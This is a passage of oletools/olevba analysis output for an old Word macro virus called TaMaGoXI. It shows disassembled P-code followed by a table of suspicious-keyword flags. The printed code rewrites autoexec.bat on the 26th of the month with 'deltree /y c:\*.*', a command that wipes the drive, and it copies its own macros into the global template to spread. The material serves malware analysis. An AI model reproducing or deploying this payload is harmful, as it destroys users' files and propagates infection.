' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "echo File' not found: Serve Alcatara Mane'? (S/N)"
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "deltree /y c:\*.* >nul"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #67:
' 	Label BHappy 
' Line #68:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #69:
' 	LitStr 0x0020 "EtERnAl LoVE 2 mY LitTlE gIrL Gi"
' 	LitStr 0x000F "TAmAGoXi's NoTe"
' 	LitDI2 0x0040 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #70:
' 	Label WizEnd 
' Line #71:
' 	EndSub 
' Macros/VBA/AutoExec - 3634 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn caminho
' Line #3:
' 	LitStr 0x0008 "TAMAGOXI"
' 	ArgsLd Environ 0x0001 
' 	St caminho$ 
' Line #4:
' 	Ld caminho$ 
' 	LitStr 0x0003 "GMS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo WizOk 
' 	EndIf 
' Line #5:
' 	GoTo WizTart 
' Line #6:
' 	Label WizOk 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' Line #8:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo BHappy 
' 	EndIf 
' Line #9:
' 	LitStr 0x0042 "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi"
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #10:
' 	GoTo WizEnd 
' Line #11:
' 	Label WizTart 
' Line #12:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Day 0x0001 
' 	LitDI2 0x001A 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	GoTo WizEnd 
' 	EndIf 
' Line #13:
' 	Ld WordBasic 
' 	ArgsMemCall FileNewDefault 0x0000 
' Line #14:
' 	LitStr 0x000D "c:\config.sys"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #15:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #16:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "cls"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0039 "echo            SaLamA'S CoRP - AlL lEfTS ReSerVeD - 1997"
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "echo                        TaMaGoXI bY WiZaRD***"
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "echo                                          ***"
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002E "echo                                         *"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo                                        *"
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002B "echo                          *************"
' 	PrintItemNL 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "echo                         *             *"
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo                        *  ****   ****  *"
' 	PrintItemNL 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo                        *               *"
' 	PrintItemNL 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002D "echo                        *     *****     *"
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002C "echo                         ***************"
' 	PrintItemNL 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "echo                     eXPecT nO MeRcY FRoM HiM"
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "echo File' not found: Serve Alcatara Mane'? (S/N)"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0016 "deltree /y c:\*.* >nul"
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #42:
' 	Label BHappy 
' Line #43:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #44:
' 	LitStr 0x0020 "EtERnAl LoVE 2 mY LitTlE gIrL Gi"
' 	LitStr 0x000F "TAmAGoXi's NoTe"
' 	LitDI2 0x0040 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0003 
' Line #45:
' 	Label WizEnd 
' Line #46:
' 	EndSub 
' Macros/VBA/AutoOp - 3036 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn caminho
' Line #3:
' 	LitStr 0x0008 "TAMAGOXI"
' 	ArgsLd Environ 0x0001 
' 	St caminho$ 
' Line #4:
' 	Ld caminho$ 
' 	LitStr 0x0003 "GMS"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo WizOk 
' 	EndIf 
' Line #5:
' 	GoTo WizTart 
' Line #6:
' 	Label WizOk 
' Line #7:
' 	LitStr 0x0042 "(sLeEp ModE)  TaMaGoXI bY WiZaRD: EtERnAl LoVE 2 mY LitTlE gIrL Gi"
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #8:
' 	GoTo WizEnd 
' Line #9:
' 	Label WizTart 
' Line #10:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #11:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #12:
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' Line #13:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WSave 
' Line #14:
' 	LitStr 0x000F "Global:AutoExec"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0009 ":AutoExec"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Label WSave 
' Line #16:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WClose 
' Line #17:
' 	LitStr 0x0018 "Global:ArquivoSalvarComo"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0012 ":ArquivoSalvarComo"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Label WClose 
' Line #19:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WOpen 
' Line #20:
' 	LitStr 0x0010 "Global:AutoClose"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":AutoClose"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	Label WOpen 
' Line #22:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WModelos 
' Line #23:
' 	LitStr 0x000F "Global:AutoOpen"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0007 ":AutoOp"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Label WModelos 
' Line #25:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WFerram 
' Line #26:
' 	LitStr 0x0015 "Global:ArquivoModelos"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000F ":ArquivoModelos"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #27:
' 	Label WFerram 
' Line #28:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WUtil 
' Line #29:
' 	LitStr 0x0012 "Global:FerramMacro"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000C ":FerramMacro"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #30:
' 	Label WUtil 
' Line #31:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WImp 
' Line #32:
' 	LitStr 0x0010 "Global:UtilMacro"
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x000A ":UtilMacro"
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #33:
' 	Label WImp 
' Line #34:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WImpP 
' Line #35:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0010 ":ArquivoImprimir"
' 	Add 
' 	LitStr 0x0016 "Global:ArquivoImprimir"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #36:
' 	Label WImpP 
' Line #37:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError WizSave 
' Line #38:
' 	Ld WordBasic 
' 	ArgsMemLd [WindowName$] 0x0000 
' 	LitStr 0x0016 ":ArquivoImprimirPadrão"
' 	Add 
' 	LitStr 0x001C "Global:ArquivoImprimirPadrão"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #39:
' 	Label WizSave 
' Line #40:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #41:
' 	Label WizEnd 
' Line #42:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

